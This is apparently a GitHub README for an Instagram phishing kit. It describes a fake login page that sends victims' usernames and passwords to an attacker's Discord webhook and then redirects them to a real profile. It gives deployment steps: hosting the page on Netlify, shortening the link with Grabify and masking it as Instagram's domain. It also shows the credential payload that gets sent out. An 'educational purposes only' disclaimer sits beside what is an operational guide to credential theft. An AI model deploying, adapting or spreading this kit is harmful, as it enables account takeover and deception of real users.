# 🔒 Instagram Phishing

This is a basic Instagram login page template with a fake login form designed for educational purposes only. It simulates an Instagram login page and sends the entered credentials to a specified Discord webhook.

⚠️ **Warning** : **This script is for learning purposes only** and should **not** be used for any unethical or illegal activities. Phishing or unauthorized access to personal data is against the law.

## 🚀 Features
- Simulates the Instagram login page with a form for username and password.
- When credentials are entered, they are sent to a Discord webhook.
- Redirects the user to a specified Instagram profile (can be changed)

## 🛠️ Installation

1. Clone the repository to your local machine :

   ```bash
   git clone https://github.com/XanderSteyn/Instagram-Phishing.git
   cd Instagram-Phishing
   ```

2. Host the Page :
   - Upload `Index.html` and `Styles.css` to a free hosting service like **Netlify**

3. Make the Link More Convincing :
   - Use a service like **Grabify** to shorten the URL
   - Mask it to appear as if it’s coming from Instagram’s domain

## ⚙️ Usage

### Customization

1. Replace the placeholder `YOUR DISCORD WEBHOOK HERE` in the `<script>` section with your own Discord webhook URL.

2. Modify the URL in `window.location.replace("https://www.instagram.com/miakhalifa/?hl=en");` to redirect to any Instagram page of your choice after the form is submitted.

### How It Works

1. The page appears as the Instagram login page.
2. Once the user enters their username and password, the form data is sent to a Discord webhook in JSON format.
3. After sending the data, the page redirects to a chosen Instagram profile.

### Example of Webhook Payload

When a user enters their username and password, the following data is sent to the Discord webhook :

```json
{
  "content": "> **USERNAME  : **user123\n> **PASSWORD : **password123"
}
```

## ❗ Ethical Considerations

This project is meant to help understand how phishing attacks work for educational and ethical hacking purposes. Using such techniques for malicious purposes is illegal and unethical.

**Please use responsibly**.

---
